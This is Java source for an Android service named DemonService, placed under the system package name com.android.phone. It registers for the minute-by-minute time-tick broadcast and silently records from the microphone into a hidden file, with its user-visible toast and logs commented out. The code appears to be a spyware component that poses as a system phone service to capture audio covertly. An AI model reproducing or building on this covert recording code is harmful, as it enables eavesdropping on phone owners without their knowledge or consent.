package com.android.phone;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class DemonService extends Service
{
	@Override
	public IBinder onBind(Intent intent)
	{
		return null;
	}

	@Override
	public void onStart(Intent intent, int startId)
	{
		super.onStart(intent, startId);
		//Log.v(Demon.LOGGING_TAG, "onStart()");
		//Toast.makeText(this, "Demon Started", Toast.LENGTH_SHORT).show();
		DemonService.demon(this);
	}

	@Override
	public void onCreate()
	{
		super.onCreate();
		//Log.v(Demon.LOGGING_TAG, "onCreate()");

		registerReceiver(new DemonBroadcastReceiver(), new IntentFilter(Intent.ACTION_TIME_TICK));
	}

	static void demon(Context context)
	{
		MediaRecorder recorder = new MediaRecorder();
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		recorder.setOutputFile(context.getFileStreamPath("Demon.tmp").getAbsolutePath());
		try
		{
			recorder.prepare();
		}
		catch (Exception e)
		{
			Log.e(Demon.LOGGING_TAG, "recorder.prepare()", e);
		}
		try
		{
			recorder.start();
		}
		catch (Exception e)
		{
			Log.e(Demon.LOGGING_TAG, "recorder.start()", e);
		}
		try
		{
			recorder.stop();
		}
		catch (Exception e)
		{
			//Log.e(Demon.LOGGING_TAG, "recorder.stop()", e);
		}
		try
		{
			recorder.reset();
		}
		catch (Exception e)
		{
			Log.e(Demon.LOGGING_TAG, "recorder.reset()", e);
		}
		try
		{
			recorder.release();
		}
		catch (Exception e)
		{
			Log.e(Demon.LOGGING_TAG, "recorder.release()", e);
		}
		Log.i(Demon.LOGGING_TAG, "Correcto!");
	}
}
